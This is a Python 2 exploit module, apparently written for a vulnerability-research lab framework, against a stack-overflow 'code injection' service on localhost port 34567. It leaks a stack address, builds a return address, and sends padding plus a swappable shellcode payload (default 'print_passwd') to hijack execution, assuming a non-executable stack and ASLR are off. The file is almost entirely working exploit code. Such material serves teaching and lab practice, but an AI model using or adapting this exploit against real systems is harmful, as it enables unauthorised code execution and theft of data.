#! /usr/bin/python
#coding:utf-8
import socket
import struct
import sys
import os
sys.path.append("../..")
from modules import exploit

class Exploit(exploit.VRL_Exploit):
    def __init__(self):
        '''Add information of your exploit here'''
        self.name = 'code_injection'
        self.info = '''Exploit Name : code injection
Exploit abstract : Code injection is the exploitation of a computer bug that is caused
                   by processing invalid data. Injection is used by an attacker to
                   introduce (or "inject") code into a vulnerable computer program and
                   change the course of execution.
Author : guoyingjie
Support change payload : true'''
        self.property = {'offset':24}# offset
        self.options={'dIP' : '127.0.0.1',
                      'port':'34567',
                      'allow_stack_exec' : 'True',
                      'aslr' : 'off',
                      'default_payload':"print_passwd"}
        self.default_payload = 'print_passwd'
        self.payload_requirement = 'NULL byte: allow\narchitecture: x64'
        self.vulnerability= 'vulnerabilities/stack_overflow/code_injection'

    def run(self):
        '''Run your exploit here, if this script could success, the VRL can run it.
        When the exploit run, follow the options.'''
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.options['dIP'], int(self.options['port'])))

        # get rbp to calculate ret_addr
        s.send("b?test")
        recv_data = s.recv(16)
        new_add = int(recv_data,16) + 16
        ret_addr = struct.pack('<Q', new_add)
        print "ret_addr = " + hex(new_add)

        data = 'A' * self.property['offset'] + ret_addr + self.payload
        s.send(data)
        s.close()

'''Bellowing is default, simply ignore it.'''
if __name__ == "__main__":
    if '__init__.py' not in os.listdir(os.curdir):
        os.mknod('__init__.py')
    exp = Exploit()
    print 'Exploit: ',exp.name,' \n'
    print 'Checking:\n'
    if exp.check():
        print 'Running:\n'
        exp.run()


